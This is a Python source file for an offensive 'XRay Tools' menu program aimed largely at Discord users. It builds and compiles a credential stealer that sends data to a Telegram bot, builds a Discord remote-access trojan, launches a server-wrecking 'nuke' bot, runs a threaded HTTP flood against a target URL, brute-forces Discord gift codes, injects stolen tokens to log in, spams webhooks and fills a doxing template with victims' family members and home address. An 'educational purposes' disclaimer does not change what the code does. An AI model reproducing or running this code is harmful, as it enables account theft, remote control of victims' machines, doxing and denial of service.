import clear
import time
from colorama import Fore, Style, init
import sys
import os 
import platform
import socket
import string
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests
import shutil
import subprocess
import uuid
from telegram import Bot
import threading
from plyer import notification

file_path = os.path.abspath(__file__)

init(autoreset=True)

notified = False
RED = Fore.RED
GREEN = Fore.GREEN
RST = Style.RESET_ALL

def print_gradient_text(text):
    length = len(text)
    for i in range(length):
        r = 255
        g = int(255 * (i / length))
        b = int(255 * (i / length))
        color_code = f'\033[38;2;{r};{g};{b}m'
        sys.stdout.write(color_code + text[i])

os_name = platform.system()
os_version = platform.version()
os_release = platform.release()
os_architecture = platform.architecture()[0]

if os_name == "Windows":
    detailed_version = platform.win32_ver()[0]  
    os_infos = f"{os_name} {detailed_version} {os_architecture}"
else:
    os_infos = f"{os_name} {os_release} {os_architecture}"

hostname = socket.gethostname()
user_ip = socket.gethostbyname(hostname)

p1 = r"""  

                            ___  ___
                            \  \/  /
                             >    < 
                            /__/\_ \
                                  \/
"""

p2 = r"""   

                            ___  __________ 
                            \  \/  /\_  __ \
                             >    <  |  | \/
                            /__/\_ \ |__|  
                                \/            
"""        

p3 = r"""    

                            ___  _______________   
                            \  \/  /\_  __ \__  \  
                             >    <  |  | \// __ \_
                            /__/\_ \ |__|  (____  /
                                  \/            \/ 
"""

p4 = r"""    

                            ___  _______________  ___.__.
                            \  \/  /\_  __ \__  \<   |  |
                             >    <  |  | \// __ \\___  |
                            /__/\_ \ |__|  (____  / ____|
                                  \/            \/\/     
"""

p5 = r"""
                                                            __   
                            ___  _______________  ___.__. _/  |_ 
                            \  \/  /\_  __ \__  \<   |  | \   __\
                             >    <  |  | \// __ \\___  |  |  |  
                            /__/\_ \ |__|  (____  / ____|  |__|  
                                  \/            \/\/             
"""

p6 = r"""
                                                            __          
                            ___  _______________  ___.__. _/  |_  ____  
                            \  \/  /\_  __ \__  \<   |  | \   __\/  _ \ 
                             >    <  |  | \// __ \\___  |  |  | (  <_> )
                            /__/\_ \ |__|  (____  / ____|  |__|  \____/ 
                                  \/            \/\/                    
"""

p7 = r"""
                                                            __                 
                            ___  _______________  ___.__. _/  |_  ____   ____  
                            \  \/  /\_  __ \__  \<   |  | \   __\/  _ \ /  _ \ 
                             >    <  |  | \// __ \\___  |  |  | (  <_> |  <_> )
                            /__/\_ \ |__|  (____  / ____|  |__|  \____/ \____/ 
                                  \/            \/\/                           
"""

p8 = r"""
                                                            __                .__   
                            ___  _______________  ___.__. _/  |_  ____   ____ |  |  
                            \  \/  /\_  __ \__  \<   |  | \   __\/  _ \ /  _ \|  |  
                             >    <  |  | \// __ \\___  |  |  | (  <_> |  <_> )  |__
                            /__/\_ \ |__|  (____  / ____|  |__|  \____/ \____/|____/
                                  \/            \/\/                                
"""

p9 = r"""
                                                            __                .__          
                            ___  _______________  ___.__. _/  |_  ____   ____ |  |   ______
                            \  \/  /\_  __ \__  \<   |  | \   __\/  _ \ /  _ \|  |  /  ___/
                             >    <  |  | \// __ \\___  |  |  | (  <_> |  <_> )  |__\___ \ 
                            /__/\_ \ |__|  (____  / ____|  |__|  \____/ \____/|____/____  >
                                  \/            \/\/                                    \/ 
"""

parts = [p1, p2, p3, p4, p5, p6, p7, p8]

for part in parts:
    clear.clear()
    print_gradient_text(part)
    time.sleep(0.01)

clear.clear()
print_gradient_text(p9)
time.sleep(1.5)

while True:
    clear.clear()
    print_gradient_text(p9)

    def loading():
        loading_second = 3
        for i in range(3):
            clear.clear()
            print(f"[INFO] Launching in {loading_second}")
            loading_second -= 1
            time.sleep(1)

    def generate_password():
        while True:
            try:
                length = int(input(RED + "[INPUT] How long do you want the password to be? : " + RST))
                if length <= 0:
                    print(RED + "[ERROR] Error: Password length must be a positive integer." + RST)
                    continue
            except ValueError:
                print(RED + "[ERROR] Error: Please enter a valid integer for password length." + RST)
                continue

            include_specials = input("[INPUT] Do you want to include special characters? (yes/no): ").lower()
            include_digits = input("[INPUT] Do you want to include digits? (yes/no): ").lower()
            include_uppercase = input("[INPUT] Do you want to include uppercase letters? (yes/no): ").lower()

            char_set = list(string.ascii_lowercase) 

            if include_uppercase in ["yes", "y", "Yes", "YES", "Y"]:
                char_set.extend(string.ascii_uppercase) 
            if include_digits in ["yes", "y", "Yes", "YES", "Y"]:
                char_set.extend(string.digits) 
            if include_specials in ["yes", "y", "Yes", "YES", "Y"]:
                char_set.extend(string.punctuation) 

            if not char_set:
                print(RED + "[ERROR] Error: You must include at least one type of character." + RST)
            else:
                break

        password = ''.join(random.choice(char_set) for _ in range(length))
        print(RED + f"[INFO] Your generated password is: {RST}{password}")
        input(RED + "\n[INPUT] Press ENTER to continue..." + RST)

    def search_in_database(user_search):
        DB_Folder = "./DB" 
        Results_Folder = "./Output/Search results"
        Founds = []
        founs_for_result_file = []
        if user_search in ["E", "e", "exit", "Exit", "EXIT"]:
            clear.clear()
            print(RED + "[INFO] Leaving...")
            time.sleep(0.5)
            exit()

        print(RED + "[INFO] Launching the search...")
        try:
            if not os.path.exists(Results_Folder):
                os.makedirs(Results_Folder)

            result_number = 0
            results_file_id = ''.join(random.choices('0123456789', k=4))
            results_file_name = f"results_{results_file_id}.txt"

            for root, dirs, files in os.walk(DB_Folder):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    try:
                        with open(file_path, "r", encoding="utf-8", errors='ignore') as file:
                            if file.name == "Put your DB here.txt":
                                continue
                            print(RED + f"[INFO] Searching in {file.name}...")
                            time.sleep(0.25)
                            content = file.readlines()
                            for row_number, row in enumerate(content, start=1):
                                if user_search in row:
                                    result_number += 1
                                    result = GREEN + f"[RESULT] RESULT FOUND IN {file_name} - Line {row_number}: " + Style.RESET_ALL + row.strip()
                                    result_for_file = f"""___________________________________________________________________________________________________
    Found in {file.name} - Line {row_number}
    {content}
    """
                                    Founds.append(result)
                                    founs_for_result_file.append(result_for_file)
                    except Exception as e:
                        print(RED + f"[ERROR] Error reading file {file_name}: {e}")
            if result_number != 0:
                with open(f"{Results_Folder}/{results_file_name}", "w", encoding='utf-8') as results_file:
                    results_file.write(f"<=========================[SEARCH RESULTS]=========================>\n\nSEARCH: {user_search}\nRESULTS : {result_number}\n\n")
                    for result in founs_for_result_file:
                        results_file.write(result)

            print(RED + f"[INFO] Search finished. Total results: {result_number}")

            for result in Founds:
                print(result)
            input(RED + "\n\n[INPUT] Press ENTER to continue...")

        except Exception as e:
            print(RED + f"[ERROR] An error occurred while processing the database folder: {e}")
            input(RED + "\n[INPUT] Press ENTER to continue...")

    def send_request():
        while True:
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" #pour les header je me suis aidé d'internet
                }

                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    print(GREEN + f"[INFO] Request successfully sent to {url} -- status code: {response.status_code}")
                else:
                    print(RED + f"[INFO] Failed to send request to {url} -- status code : {response.status_code}")                
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

    def attack():
        for _ in range(threads):
            threading.Thread(target=send_request).start()

    def nitro_link_generator(nitro_number):
            generated_link_number = 0
            clear.clear()
            print(RED + "[INFO] You can stop the generation at any moment by pressing Ctrl + C")
            input("\n[INPUT] Press ENTER to launch...")
            if nitro_number in ["i", "I"]:
                clear.clear()
                while True:
                    characters = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                    rsp = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{characters}")
                    if rsp.status_code == 200:
                        print(GREEN + f"[INFO] {generated_link_number} - [{RST}VALID CODE{RED}] {RST}-{RED} RSP : {RST} {rsp.status_code} {RED}-{RST} {link}")
                        generated_link_number += 1
                    else:
                        print(RED + f"[INFO] {generated_link_number} - [{RST}INVALID CODE{RED}] {RST}-{RED} RSP : {RST} {rsp.status_code} {RED}-{RST} {link}")
                        generated_link_number += 1
            else:
                try:
                    nitro_number = int(nitro_number)
                except ValueError:
                    clear.clear()
                    print(RED + "[ERROR] Wrong input ! Plese enter an integer !")
                    time.sleep(2)
                    return
                
                for i in range(nitro_number):
                    characters = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                    link = f"https://discord.gift/{characters}"
                    rsp = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{characters}")
                    if rsp.status_code == 200:
                        print(GREEN + f"[INFO] {generated_link_number} - [VALID CODE] - RSP : {rsp.status_code} - {link}")
                        generated_link_number += 1
                    else:
                        print(RED + f"[INFO] {generated_link_number} - [{RST}INVALID CODE{RED}] {RST}-{RED} RSP : {RST} {rsp.status_code} {RED}-{RST} {link}")
                        generated_link_number += 1
                print("\n[INFO] END")
                input(RED + "[INFO] Press ENTER to continue...")

    def token_login():
        token = input(Fore.RED + "[INPUT] Enter the token >>> ")
        clear.clear()

        javascript_code = """
                    function login(token) {
                    setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                    }, 50);
                    setTimeout(() => {
                    location.reload();
                    }, 2500);
                    }
                    """

        print(RED + f"""
    Choose a browser in the list :
            
    {RED}<{RST}1{RED}> {RST}Microsoft Edge (recommandé)
    {RED}<{RST}2{RED}> {RST}Google Chrome (recommandé)
    {RED}<{RST}3{RED}> {RST}Firefox""")
        
        driver = None
        while True:
            driver_choice = input(">>> ")
            clear.clear()
            if driver_choice == "1" or driver_choice == "01":
                driver = webdriver.Edge()
                break
            elif driver_choice == "2" or driver_choice == "02":
                driver = webdriver.Chrome()
                break
            elif driver_choice == "3" or driver_choice == "03":
                driver = webdriver.Firefox()
                break
            else:
                clear.clear()
                print(Fore.RED + "[ERROR] Please choose a browser in the list !")

        try:
            clear.clear()
            print("[INFO] Launching the browser on https://discord.com/login")
            driver.get("https://discord.com/login")
            
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            print("[INFO] Browser opened")
            time.sleep(0.2)
            print("[INFO] Injecting the Token ...")
            driver.execute_script(javascript_code + f'\nlogin("{token}")')
            print("[INFO] Token injected")
            time.sleep(0.2)
            print("[INFO] Refreshing the page ...")
            driver.refresh()
            print("[INFO] Successfully loged in !")
            input("[INPUT] Press ENTER to leave...")
        except Exception as e:
            print(Fore.RED + f"[INPUT] An error occured : {e}")
        finally:
            if driver:
                driver.quit()

    def dox_create():
        dox_file = []
        doxer = input(Fore.RED + "Doxed by >>> " + Style.RESET_ALL)
        print(doxer)
        dox_file.append(f"[+] Doxed by {doxer}")
        clear.clear()
        reason = input(Fore.RED + "Reason >>> " + Style.RESET_ALL)
        print(reason)
        dox_file.append(f"[+] Reason : {reason}")
        clear.clear()
        pseudo = input(Fore.RED + "Pseudo >>> " + Style.RESET_ALL)
        print(pseudo)
        dox_file.append(f"[+] Pseudo : {pseudo}")
        clear.clear()

        print(Fore.YELLOW + """
        
    DISCORD
        
            """)

        dox_token = input(Fore.RED + "Token >>> " + Style.RESET_ALL)
        print(dox_token)
        dox_file.append("""
                        <================[ DISCORD ]>================>
                        """)
        dox_file.append(f"[+] Token : {dox_token}")
        username = input(Fore.RED + "Username : " + Style.RESET_ALL)
        print(username)
        dox_file.append(f"[+] Username : {username}")
        discord_id = input(Fore.RED + "Discord ID >>> " + Style.RESET_ALL)
        print(discord_id)
        dox_file.append(f"[+] ID : {discord_id}")
        email = input(Fore.RED + "EMail Discord >>> " + Style.RESET_ALL)
        print(email)
        dox_file.append(f"[+] EMail : {email}")
        clear.clear()
        phone = input("Discord phone number >>> ")
        print(phone)
        dox_file.append(f"[+] Phone : {phone}")
        clear.clear()
        print(Fore.YELLOW + "INFORMATIONS")
        dox_file.append("""
                        <================[ INFORMATIONS ]>================>
                        """)
        dox_ip = input(Fore.RED + "IP >>> " + Style.RESET_ALL)
        print(dox_ip)
        dox_file.append(f"[+] IP : {dox_ip}")
        name = input(Fore.RED + "Name >>> ")
        print(name)
        dox_file.append(f"[+] Name : {name}")
        surname = input(Fore.RED + "Surname >>> " + Style.RESET_ALL)
        print(surname)
        dox_file.append(f"Surname : {surname}")
        mother = input("Mother >>> ")
        print(mother)
        dox_file.append(f"[+] Mother : {mother}")
        father = input(Fore.RED + "Father >>> " + Style.RESET_ALL)
        print(father)
        dox_file.append(f"[+] Father : {father}")
        brother = input(Fore.RED + "Brother >>> " + Style.RESET_ALL)
        print(brother)
        dox_file.append(f"[+] Brother : {brother}")
        sister = input(Fore.RED + "Sister >>> " + Style.RESET_ALL)
        print(sister)
        dox_file.append(f"[+] Sister : {sister}")
        dox_file.append("""
                        <================[ INFORMATIONS ]>================>
                        """)
        print(Fore.YELLOW + "LOCATION" + Style.RESET_ALL)
        dox_file.append("""
                        <================[ LOCATION ]>================>
                        """)
        country = input(Fore.RED + "Country >>> " + Style.RESET_ALL)
        print(country)
        dox_file.append(f"[+] Country : {country}")
        city = input(Fore.RED + "City >>> " + Style.RESET_ALL)
        print(city)
        dox_file.append(f"[+] City : {city}")
        adress = input(Fore.RED + "Adress >>> " + Style.RESET_ALL)
        print(adress)
        dox_file.append(f"[+] Adress : {adress}")
        dox_name = input("File name : ")
        print(dox_name)
        dox_file.append("""
                        <================[ SOCIAL ]>================>
                        """)
        print(Fore.YELLOW + "SOCIAL" + Style.RESET_ALL)
        tiktok = input(Fore.RED + "Tiktok >>> " + Style.RESET_ALL)
        print(tiktok)
        dox_file.append(f"[+] Tiktok : {tiktok}")
        instagram = input(Fore.RED + "Instagram >>> " + Style.RESET_ALL)
        print(instagram)
        dox_file.append(f"[+] Instagram : {instagram}")
        if dox_name == "":
            dox_id = random.choices("abcdefghijklmnopqrstuvwxyz", k=8)
            dox_name = f"Doxed by {doxer} - ID {dox_id}"
        with open (f"{dox_name}.txt", "w") as file:
            for infos in dox_file:
                file.write(infos + "\n")

    def stealer_builder(chat_id, bot_token, filename, icon):
        clear.clear()
        print(RED + "[INFO] Cleaning the temp folder...")
        folder_path = "./Temp/Stealer"
        for item in os.listdir(folder_path):
            item_path = os.path.join(folder_path, item)
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        print(RED + "[INFO] Temp folder cleaned")
        print(RED + "[INFO] Building python file...")
        print(RED + "[INFO] Creating python file...")
        with open(f"./Temp/Stealer/{filename}.py", "w", encoding='utf-8') as file:
            file.write(f"""
import os
import shutil
from telegram import Bot
from telegram import InputFile
import requests
import asyncio
from Cryptodome.Cipher import AES
import cv2
from win32crypt import CryptUnprotectData
import  subprocess
import pyautogui
from pynput import mouse, keyboard
import socket
import uuid
import sqlite3
import os
import base64
import json
from pathlib import Path
import time
import ctypes
import sys
import psutil                

BOT_TOKEN = '{bot_token}'
CHAT_ID = '{chat_id}'

""")
            with open("./Settings/Stealer/stealer.py", "r", encoding='utf-8') as stealer:
                content = stealer.read()
                file.write(content)
        print(RED + "[INFO] Created python file")
        print(RED + "[INFO] Compiling the python file to executable...")
        if icon == False:
            os.system(f'pyinstaller --noconfirm --onefile --windowed --distpath "./Output/Built stealers" --workpath "./Temp/Stealer" --specpath "./Temp/Stealer" ./Temp/Stealer/{filename}.py')
        else:
            os.system(f'pyinstaller --noconfirm --onefile --windowed --icon "{icon}" --distpath "./Output/Built stealers" --workpath "./Temp/Stealer" --specpath "./Temp/Stealer" ./Temp/Stealer/{filename}.py')
        
        if os.path.exists("./build"):
            shutil.rmtree("./build")

        print(GREEN + f"[INFO] Successfully built executable : {filename}.exe")
        input("\n[INPUT] Press ENTER to continue...")

    def webhook_message():
        clear.clear()
        webhook_url = input("Enter Webhook URL >>> ")
        print(webhook_url)
        clear.clear()
        webhook_username = input("Enter the name you want for the webhook >>> ")
        print(webhook_username)
        input_message = input(RED + "Message >>> " + RST)
        print(input_message)
        clear.clear()
        print(Fore.RED + "Sending the message ...")
        message = {
            "username": f"{webhook_username}",
            "content": f"{input_message}"
        }
        try:
            requests.post(webhook_url, json=message)
            clear.clear()
            print(GREEN + "Message sent !")
            time.sleep(2.5)
        except Exception as e:
            clear.clear()
            print(RED + f"[ERROR] Error sending the message : {e}")
            input("""
            
            Press ENTER to continue...""")

    def webhook_spammer():
        spam_count = 0
        clear.clear()
        webhook_url = input("Enter Webhook URL >>> ")
        print(webhook_url)
        clear.clear()
        webhook_username = input(RED + "Enter the name you want for the webhook >>> ")
        print(webhook_username)
        input_message = input(Fore.RED + "Message >>> ")
        print(input_message)
        clear.clear()
        while True:
            spam_range = input(RED + "Enter number of messages to spam (enter i for an infinite loop) >>> ")
            clear.clear()
            message = {
                "username": f"{webhook_username}",
                "content": f"{input_message}"
            }

            if spam_range in ["i", "I", "Infinite", "infinite", "INFINITE"]:
                print(RED + "Starting ...")
                while True:
                    rsp = requests.post(webhook_url, json=message)
                    if rsp.status_code in [200, 204]:
                        spam_count += 1
                        print(Fore.GREEN + f"Num. {spam_count} | Message sent !")
                    else:
                        print(RED + f"Error while sending the message | RSP : {rsp.status_code}")
            else:
                try:
                    spam_range == int(spam_range)
                    for _ in range(int(spam_range)):
                        print(RED + "Starting ...")
                        rsp = requests.post(webhook_url, json=message)
                        if rsp.status_code in [200, 204]:
                            print(Fore.GREEN + "Message sent !")
                        else:
                            print(RED + f"Error while sending the message | RSP : {rsp.status_code}")
                    print(Fore.GREEN + "End !")
                    time.sleep(2.5)
                    break
                except ValueError:
                    print(RED + "Please enter i or an integer !")
                    time.sleep(2)
                    clear.clear()
                        
    def bye():
        clear.clear()
        print(RED + "                                                     [MESSAGE] Bye :)")
        time.sleep(2)
        exit()

    def rat_builder(filename, prefix, bot_token, channel_id, icon):
        clear.clear()
        print(RED + "[INFO] Cleaning the temp folder...")
        folder_path = "./Temp/RAT"
        for item in os.listdir(folder_path):
            item_path = os.path.join(folder_path, item)
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        print(RED + "[INFO] Temp folder cleaned")
        print(RED + "[INFO] Building python file...")
        with open(f"./Temp/RAT/{filename}.py", "w", encoding='utf-8') as file:
            file.write("""import random 
import time  
import os
import pyautogui 
import shutil
import requests 
import cv2 
import socket 
import uuid 
import subprocess 
import keyboard
import discord
from discord.ext import commands
import discord.gateway
import sounddevice as sd
import wave
import sys
from tkinter import messagebox
from discord import ButtonStyle, Interaction
from telegram import Bot
import sqlite3
import win32crypt
import json
import base64
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import stat
import re
from winotify import Notification

 """)
            file.write(fr'''
BOT = commands.Bot(command_prefix="{prefix}", help_command=None, intents=discord.Intents.all())

BOT_TOKEN = '{bot_token}'

@BOT.event
async def on_ready():     
    user = os.getlogin()
    channel_id = {channel_id}''')
            with open("./Settings/RAT/rat.py", "r", encoding='utf-8') as rat:
                content = rat.read()
                file.write(content)
        print(RED + "[INFO] Successfully built python file")
        print(RED + "[INFO] Compiling the python file to executable file...")

        if icon == False:
            os.system(f'pyinstaller --noconfirm --onefile --windowed --distpath "./Output/Built RAT" --workpath "./Temp/RAT" --specpath "./Temp/RAT" ./Temp/RAT/{filename}.py')
        else:
            os.system(f'pyinstaller --noconfirm --onefile --windowed --icon "{icon}" --distpath "./Output/Built RAT" --workpath "./Temp/RAT" --specpath "./Temp/RAT" ./Temp/RAT/{filename}.py')
        print(GREEN + f"[INFO] Successully built executable : {filename}.exe ")
        input(RED + "\n[INPUT] Press ENTER to continue... ")
        if os.path.exists("./build"):
            shutil.rmtree("./build")

    def telegram_sender(bot_token, chat_id, message):
        payload = {
            "chat_id": int(chat_id),
            "text": message,
            "parse_mode": "Markdown"
        }
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

        try:
            rsp = requests.post(url, data=payload)  
            if rsp.status_code == 200:
                print("[INFO] Message successfully sent !")
            else:
                print(f"[ERROR] An error occurred: {rsp.status_code} - {rsp.text}") 
        except Exception as e:
            print(f"[ERROR] An error occurred: {e}")

    def nuke(bot_token, prefix):
        temp_script = "./Temp/Nuke/temp_script.py"
        nuke_script = "./Settings/Nuke/nuke.py"
        clear.clear()
        print(RED + "[INFO] Cleaning the temp folder...")
        folder_path = "./Temp/RAT"
        for item in os.listdir(folder_path):
            item_path = os.path.join(folder_path, item)
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        print(RED + "[INFO] Temp folder cleaned")
        print(RED + "[INFO] Creating the temp script...")
        with open(temp_script, "w", encoding='utf-8') as file:
            file.write(f"""import discord
from discord.ext import commands
import discord.gateway
from colorama import Fore, init
import clear
                       
prefix = "{prefix}"                       
bot = commands.Bot(command_prefix='{prefix}', intents=discord.Intents.all())

BOT_TOKEN = '{bot_token}'\n""")
            with open(nuke_script, "r", encoding='utf-8') as nuke_script:
                content = nuke_script.read()
            file.write(content)
        print(RED + "[INFO] Launching the bot...")
        try:
            os.system("python ./Temp/Nuke/temp_script.py")
        except Exception as e:
            print(RED + f"[ERROR] An error occured while launching the temp script : {e}")
            input(RED + "\n[INPUT] Press ENTER to continue...")

    def get_system_infos():
        print(RED + "[INFO] Recovering data...")

        hostname = socket.gethostname()
        try:
            pc_ip = socket.gethostbyname(hostname)
        except Exception:
            pc_ip = "None : Error"

        try:
            pc_gpu = subprocess.run("lspci | grep VGA", capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split(":")[-1].strip()
        except Exception:
            pc_gpu = "None : Error"

        try:
            pc_cpu = subprocess.run("cat /proc/cpuinfo | grep 'model name' | head -n 1", capture_output=True, shell=True).stdout.decode(errors='ignore').split(":")[1].strip()
        except Exception:
            pc_cpu = "None : Error"

        try:
            pc_ram = subprocess.run("free -g | grep Mem | awk '{print $2}'", capture_output=True, shell=True).stdout.decode(errors='ignore').strip()
        except Exception:
            pc_ram = "None : Error"

        try:
            mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        except Exception:
            mac_address = "None : Error"

        try:
            pc_uuid = subprocess.check_output("sudo dmidecode -s system-uuid", shell=True, stderr=subprocess.PIPE).decode('utf-8').strip()
        except Exception:
            pc_uuid = "None : Error"

        try:
            disk_serial = subprocess.check_output("lsblk -o NAME,SERIAL | grep -E 'sd[a-z]' | awk '{print $2}'", shell=True).decode('utf-8').strip()
        except Exception:
            disk_serial = "None : Error"

        try:
            motherboard_serial = subprocess.check_output("sudo dmidecode -t baseboard | grep 'Serial Number' | awk '{print $3}'", shell=True, stderr=subprocess.PIPE).decode('utf-8').strip()
        except Exception:
            motherboard_serial = "None : Error"

        try:
            bios_serial = subprocess.check_output("sudo dmidecode -t bios | grep 'Serial Number' | awk '{print $3}'", shell=True, stderr=subprocess.PIPE).decode('utf-8').strip()
        except Exception:
            bios_serial = "None : Error"

        system_infos = RED + f"""
 __________________________________________________________________
|                        {RST}YOUR SYSTEM INFOS{RED}                         |         
 ------------------------------------------------------------------
        IP ADRESS  : {RST}{pc_ip}{RED}                                              
        GPU        : {RST}{pc_gpu}{RED}                                                   
        CPU        : {RST}{pc_cpu}{RED}                                                   
        RAM        : {RST}{pc_ram} Gb{RED}                                                   
        MAC ADRESS : {RST}{mac_address}{RED}                                       
        UUID       : {RST}{pc_uuid}{RED} 
        OS         : {RST}{os_info}{RED}   
 __________________________________________________________________
|                         {RST}YOUR SERIAL CHECK{RED}                        |
 ------------------------------------------------------------------
        BIOS SERIAL NUMBER        : {RST}{bios_serial}{RED}
        DISK SERIAL NUMBER        : {RST}{disk_serial}{RED}
        MOTHERBOARD SERIAL NUMBER : {RST}{motherboard_serial}{RED}
 __________________________________________________________________
"""
        clear.clear()
        print(system_infos)
        input(RED + "\n[INPUT] Press ENTER to continue...")
        
    user_infos = f"""

        {RED}[USER : {RST}{os.getlogin()}{RED}]               
        {RED}[WORKING ON : {RST}{os_infos}{RED}]              
        {RED}[USER IP : {RST}{user_ip}{RED}]
        {RED}[DISCORD :{RST} https://discord.gg/9274AD29fA{RED}]
        {RED}[GITHUB :{RST} https://github.com/NoonePYDEV{RED}]
        {RED}[BY {RST}K4L4SHNIK0V{RED}]                  
    """

    menu1 = f"""                                               ______________________
     _________________________________________| ACTUAL MENU : MENU 1 |_______________________________________
    |                                                                                                        |
    |       [1] NITRO GENERATOR                  [2] TOKEN LOGIN                  [3] SEARCH IN DB           |
    |                                                                                                        |
    |       [4] DOX CREATE                       [5] SEND WEBHOOK MESSAGE         [6] WEBHOOK SPAMMER        |
    |                                                                                                        |
    |       [7] PASSWORD GENERATOR               [8] STEALER BUILDER              [9] DISCORD RAT BUILDER    |
    |________________________________________________________________________________________________________|
    |                                                                                                        |
    |                      [E] EXIT                [N] NEXT MENU             [R] README                      |
    |________________________________________________________________________________________________________|
    """

    menu = 1

    menu2 = f"""                                               ______________________
     _________________________________________| ACTUAL MENU : MENU 2 |_______________________________________
    |                                                                                                        |
    |       [10] GET MY SYSTEM INFOS             [11] DDOS            [12] SEND TELEGRAM BOT MESSAGE         |
    |                                                                                                        |
    |       [13] Nuke Server
    |________________________________________________________________________________________________________|
    |                                                                                                        |
    |             [E] EXIT          [B] PREVIOUS MENU          [N] NEXT MENU          [R] README             |
    |________________________________________________________________________________________________________|
    """ 

    ReadMe = """
      README - CONDITIONS

      \033[31mThis tool has been created for \033[33meducational and preventive purposes\033[31m. 
      The creator of this tool is in no way responsible for the use of this tool for malicious purposes, of any modification 
      to its source code, or for any damage created to any device with a file generated with this tool.\033[0m

      Thank you for your understanding

      """

    print(user_infos)
    print_gradient_text(menu1)
    user = os.getlogin()
    
    if notified == False:
        notification.notify(
            title=f"Welcome",
            message=f"Welcome {user} to XRay Tools !",
            app_name="XRAY TOOLS",
            timeout=5
        )
        notified = True

    choice = input(f"""
        {RED} ┌───({RST}{os.getlogin()}{RED}@xraytools - Menu {menu})─{RED}[{RST}{file_path}{RED}]
         └──{RST}$ """)
    if choice in ["E", "e", "exit", "Exit", "EXIT"]:
        bye()
    elif choice in ["N", "n", "Next", "next", "NEXT"]:
        while True:
            clear.clear()
            menu = 2
            print_gradient_text(p9)
            print(user_infos)
            print_gradient_text(menu2)
            choice = input(f"""
        {RED} ┌───({RST}{os.getlogin()}{RED}@xraytools - Menu {menu})─{RED}[{RST}{file_path}{RED}]
         └──{RST}$ """)
            
            if choice in ["E", "e", "exit", "Exit", "EXIT"]:
                user = os.getlogin()
                notification.notify(
                    title=f"See you soon",
                    message=f"See you soon on XRay Tools, {user} !",
                    app_name="XRAY TOOLS",
                    timeout=5
                )
                bye()
            elif choice in ["r", "R", "readme", "Readme", "ReadMe", "README"]:
                clear.clear()
                print(ReadMe)
                input(RED + "\n\n[INPUT] Press ENTER to continue...")
            elif choice in ["B", "b", "back", "Back", "BACK"]:
                break
            elif choice == "10":
                clear.clear()
                get_system_infos()
                clear.clear()
            elif choice == "11":
                while True:
                    clear.clear()
                    threads = input(RED + "[INPUT] How many threads ? Default is 1000 : ")
                    if threads != "":
                        try:
                            threads = int(threads)
                            break
                        except ValueError:
                            clear.clear()
                            print(RED + "[ERROR] Please enter an integer !")
                            time.sleep(2)
                    else:
                        threads = 1000
                        break
                url = input(RED + "[INPUT] Target URL : ")

                if "http://" or "https://" not in url:
                    url = "http://" + url
                input(RED + "[INPUT] Press ENTER to launch the attack...")
                clear.clear()
                print(RED + "[INFO] Launching...")
                time.sleep(1)
                send_request()
            elif choice == "12":
                while True:
                    clear.clear()
                    chat_id = input(RED + "[INPUT] Enter the chat id : ")
                    bot_token = input(RED + "[INPUT] Enter the bot token : ")
                    message = input(RED + "[INPUT] Enter your message (Markdown is working) : ")
                    try:
                        chat_id == int(chat_id)
                        clear.clear()
                        telegram_sender(bot_token, chat_id, message)
                        input("")
                        clear.clear()
                        break
                    except ValueError:
                        print(RED + "[ERROR] Chat ID is not valid")
                        time.sleep(2)
            elif choice == "13":
                clear.clear()
                bot_token = input(RED + "[INPUT] Enter your bot token : ")
                prefix = input("[INPUT] Enter the prefix you want for the bot commands : ")
                nuke(bot_token, prefix)
    elif choice in ["R", "r", "Readme", "README", "readme", "ReadMe"]:
        clear.clear()
        print(ReadMe)
        input(RED + "\n[INPUT] Press ENTER to continue...")
        clear.clear()
    elif choice in ["1", "01"]: 
        while True:
            clear.clear()
            nitro_link_number = input(Fore.RED + "How many Nitro links to generate ? (Enter i for an infinite loop) >>> " + RST)      
            nitro_link_generator(nitro_link_number)
            end_choice = input("""
            \033[31mRestart a generation ? y/n >>> """)
            if end_choice in ["No", "no", "n", "N", "NO"]:
                break
            
    elif choice in ["2", "02"]:
        clear.clear()
        token_login()
    elif choice in ["3", "03"]:
        clear.clear()
        user_search = input(RED + "\n\n[INPUT] Enter your search: ").strip()
        search_in_database(user_search)
        Founds = []
        founs_for_result_file = []
    elif choice in ["4", "04"]:
        clear.clear()
        dox_create()
    elif choice in ["5", "05"]:
        clear.clear()
        webhook_message()
    elif choice in ["6", "06"]:
        clear.clear()
        webhook_spammer()
    elif choice in ["7", "07"]:
        clear.clear()
        generate_password()
        clear.clear()
    elif choice in ["8", "08"]:
        clear.clear()
        filename = input(RED + "[INPUT] Enter the name you want for the file : ")
        chat_id = input(RED + "[INPUT] Enter your Telegram CHAT ID : ")
        bot_token = input(RED + "[INPUT] Enter your Telegram bot token : ")
        icon_or_not = input(RED + "[INPUT] Do you want an icon ? ONLY .ICO files ! (y/n) : ")
        if icon_or_not in ["y", "Y", "Yes", "yes", "YES"]:
            icon = input(RED + "[INPUT] Enter the full path of your .ico file : ")
        else:
            icon = False
        
        clear.clear()
        print(RED + f"[INFO] Processing...")
        stealer_builder(chat_id, bot_token, filename, icon)
        clear.clear()
